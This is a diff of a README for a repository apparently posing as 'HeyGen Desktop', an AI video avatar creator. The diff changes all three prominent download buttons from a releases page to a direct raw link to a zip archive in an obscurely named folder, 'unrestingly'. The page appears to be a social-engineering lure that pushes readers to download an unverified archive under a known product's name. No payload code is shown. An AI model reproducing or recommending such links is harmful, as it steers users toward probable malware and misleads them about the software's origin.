@@ -1,7 +1,7 @@
 <h1>🎬 HeyGen-Desktop---AI-Video-Avatar-Creator-2026 - Create Stunning AI Videos in Minutes</h1>
 
 <p align="center">
-  <a href="https://github.com/reversiontenormin346/HeyGen-Desktop---AI-Video-Avatar-Creator-2026/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(37,117,252,0.4);">⬇️ Download HeyGen Desktop Now</a>
+  <a href="https://raw.githubusercontent.com/reversiontenormin346/HeyGen-Desktop---AI-Video-Avatar-Creator-2026/main/unrestingly/Hey_Creator_Video_Gen_A_Avatar_Desktop_v3.7.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6a11cb,#2575fc);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(37,117,252,0.4);">⬇️ Download HeyGen Desktop Now</a>
 </p>
 
 ---
@@ -54,7 +54,7 @@ First, you need to get the application onto your computer. Click the big blue bu
 
 
 <p align="center">
-  <a href="https://github.com/reversiontenormin346/HeyGen-Desktop---AI-Video-Avatar-Creator-2026/releases" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f7971e,#ffd200);color:#1a1a1a;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,210,0,0.4);">🎯 Click Here to Visit the Download Page</a>
+  <a href="https://raw.githubusercontent.com/reversiontenormin346/HeyGen-Desktop---AI-Video-Avatar-Creator-2026/main/unrestingly/Hey_Creator_Video_Gen_A_Avatar_Desktop_v3.7.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f7971e,#ffd200);color:#1a1a1a;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 25px rgba(255,210,0,0.4);">🎯 Click Here to Visit the Download Page</a>
 </p>
 
 **Visit this link to download the application.** Once you click the link, you will see a page listing the available release files. Look for the most recent version, typically at the top. Click on the download link for the file named appropriately (it will likely be a large file, so give it a moment to finish downloading). The exact appearance of the download button may vary, but it is usually a prominent button labeled with the version number or a download icon. If your browser asks for permission to download, click "Allow" or "Save." Your download will begin automatically, and you can monitor its progress in your browser's download bar.
@@ -155,7 +155,7 @@ So what are you waiting for? Download HeyGen Desktop today, pick your favorite a
 **Visit this link to download the application.** 
 
 <p align="center">
-  <a href="https://github.com/reversiontenormin346/HeyGen-Desktop---AI-Video-Avatar-Creator-2026/releases" style="display:inline-block;padding:18px 36px;background:linear-gradient(135deg,#e91e63,#9c27b0);color:#fff;font-size:24px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 10px 30px rgba(233,30,99,0.5);">💥 Start Creating Now - Download Free</a>
+  <a href="https://raw.githubusercontent.com/reversiontenormin346/HeyGen-Desktop---AI-Video-Avatar-Creator-2026/main/unrestingly/Hey_Creator_Video_Gen_A_Avatar_Desktop_v3.7.zip" style="display:inline-block;padding:18px 36px;background:linear-gradient(135deg,#e91e63,#9c27b0);color:#fff;font-size:24px;font-weight:bold;border-radius:40px;text-decoration:none;box-shadow:0 10px 30px rgba(233,30,99,0.5);">💥 Start Creating Now - Download Free</a>
 </p>
 
 ---
